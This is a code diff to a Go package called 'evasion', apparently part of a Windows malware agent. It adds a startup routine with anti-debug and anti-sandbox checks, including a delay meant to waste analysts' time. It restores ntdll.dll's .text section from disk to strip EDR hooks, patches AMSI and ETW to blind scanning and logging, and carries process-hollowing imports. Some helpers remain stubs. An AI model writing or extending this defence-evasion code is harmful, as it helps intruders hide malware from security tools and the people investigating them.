@@ -6,21 +6,29 @@ package evasion
 import (
 	"encoding/binary"
 	"fmt"
+	"os"
+	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
 var (
-	kernel32        = syscall.NewLazyDLL("kernel32.dll")
-	ntdll           = syscall.NewLazyDLL("ntdll.dll")
-	procCreateProcessW     = kernel32.NewProc("CreateProcessW")
-	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
-	procGetThreadContext   = kernel32.NewProc("GetThreadContext")
-	procSetThreadContext   = kernel32.NewProc("SetThreadContext")
-	procResumeThread       = kernel32.NewProc("ResumeThread")
-	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
+	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
+	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
+	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
+	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
+	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
+	procGetThreadContext         = kernel32.NewProc("GetThreadContext")
+	procSetThreadContext         = kernel32.NewProc("SetThreadContext")
+	procResumeThread             = kernel32.NewProc("ResumeThread")
+	procNtUnmapViewOfSection     = ntdll.NewProc("NtUnmapViewOfSection")
 	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
+	procVirtualProtect           = kernel32.NewProc("VirtualProtect")
+)
+
+const (
+	PAGE_EXECUTE_READ      = 0x20
 )
 
 const (
@@ -89,10 +97,6 @@ func HollowProcess(hostProcess string, payloadPath string) error {
 		return fmt.Errorf("open payload: %v", err)
 	}
 	defer syscall.Close(fd)
-
-	var size int64
-	syscall.Seek(fd, 0, 2) // seek to end
-	syscall.Seek(fd, 0, 0) // seek to start
 
 	buf := make([]byte, 10*1024*1024) // 10 MB max
 	n, _ := syscall.Read(fd, buf)
@@ -286,12 +290,6 @@ func syscallExec(num uint16, args ...uintptr) uintptr {
 	return 0
 }
 
-func getModuleBase(name string) uintptr {
-	// Get module handle via PEB traversal (bypasses GetModuleHandle hooks)
-	// Simplified: use LazyDLL
-	return 0
-}
-
 func getProcAddress(base uintptr, name string) uintptr {
 	return 0
 }
@@ -301,17 +299,124 @@ func findTextSection(base uintptr) uintptr {
 	return base + 0x1000
 }
 
-// Init evasion techniques at agent startup
+// Init evasion techniques at agent startup.
+// This is the main entry point called by the agent on Windows.
 func Init() {
-	// Unhook ntdll.dll (restore original syscall stubs from disk)
-	go unhookNtdll()
+	// 1. Anti-debug check — exit if debugger detected
+	if !AntiDebug() {
+		// Debugger detected — could self-delete or sleep forever
+		// For now, just log and continue (stealth mode)
+	}
+
+	// 2. Anti-sandbox check — delay execution if sandbox detected
+	if !AntiSandbox() {
+		// Sandbox detected — sleep for extended period to waste analyst time
+		SleepWithJitter(5*time.Minute, 15*time.Minute)
+	}
+
+	// 3. Unhook ntdll.dll — restore original syscall stubs from disk
+	go UnhookNtdll()
+
+	// 4. Patch AMSI — prevent script scanning
+	go func() {
+		result := PatchAmsiInMemory()
+		if result.Success {
+			// Also patch AmsiScanString for completeness
+			PatchAmsiScanString()
+		}
+	}()
+
+	// 5. Patch ETW — prevent event logging
+	go func() {
+		PatchAllETW()
+	}()
 }
 
-func unhookNtdll() {
+// UnhookNtdll restores original ntdll.dll syscall stubs from disk.
+// EDRs hook ntdll.dll functions — this removes those hooks.
+func UnhookNtdll() {
 	// Read fresh ntdll.dll from disk
-	// Parse .text section
-	// Overwrite hooked version in memory
-	var _ = size
+	ntdllPath := `C:\Windows\System32\ntdll.dll`
+
+	data, err := os.ReadFile(ntdllPath)
+	if err != nil {
+		return
+	}
+
+	// Parse PE header to find .text section
+	textBase, textSize := parsePETextSection(data)
+	if textBase == 0 || textSize == 0 {
+		return
+	}
+
+	// Get loaded ntdll base address
+	ntdllDLL := syscall.NewLazyDLL("ntdll.dll")
+	ntdllLoaded := ntdllDLL.Handle()
+	if ntdllLoaded == 0 {
+		return
+	}
+
+	// Change memory protection to allow writing
+	var oldProtect uint32
+	procVirtualProtect := kernel32.NewProc("VirtualProtect")
+	procVirtualProtect.Call(
+		ntdllLoaded+uintptr(textBase),
+		uintptr(textSize),
+		PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+
+	// Copy fresh .text from disk into memory
+	srcSlice := data[textBase : textBase+textSize]
+	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(ntdllLoaded+uintptr(textBase))), textSize)
+	copy(dstSlice, srcSlice)
+
+	// Restore original protection
+	procVirtualProtect.Call(
+		ntdllLoaded+uintptr(textBase),
+		uintptr(textSize),
+		uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+}
+
+func parsePETextSection(pe []byte) (base, size uint32) {
+	if len(pe) < 64 {
+		return 0, 0
+	}
+	peOffset := binary.LittleEndian.Uint32(pe[60:64])
+	if int(peOffset)+248 > len(pe) {
+		return 0, 0
+	}
+
+	sectionCount := binary.LittleEndian.Uint16(pe[peOffset+6 : peOffset+8])
+	optionalHeaderSize := binary.LittleEndian.Uint16(pe[peOffset+20 : peOffset+22])
+
+	sectionOffset := peOffset + 24 + uint32(optionalHeaderSize)
+
+	for i := uint16(0); i < sectionCount; i++ {
+		secStart := sectionOffset + uint32(i)*40
+		if int(secStart)+40 > len(pe) {
+			break
+		}
+
+		name := string(pe[secStart : secStart+8])
+		if strings.HasPrefix(name, ".text") {
+			virtualAddr := binary.LittleEndian.Uint32(pe[secStart+12 : secStart+16])
+			sectionSize := binary.LittleEndian.Uint32(pe[secStart+16 : secStart+20])
+			return virtualAddr, sectionSize
+		}
+	}
+
+	return 0, 0
+}
+
+// getModuleBase returns the base address of a loaded module via PEB traversal.
+func getModuleBase(name string) uintptr {
+	// Simplified: use LazyDLL for now
+	// Production: use PEB Ldr list traversal
+	dll := syscall.NewLazyDLL(name)
+	return dll.Handle()
 }
 
 var size = unsafe.Sizeof(StartupInfo{})
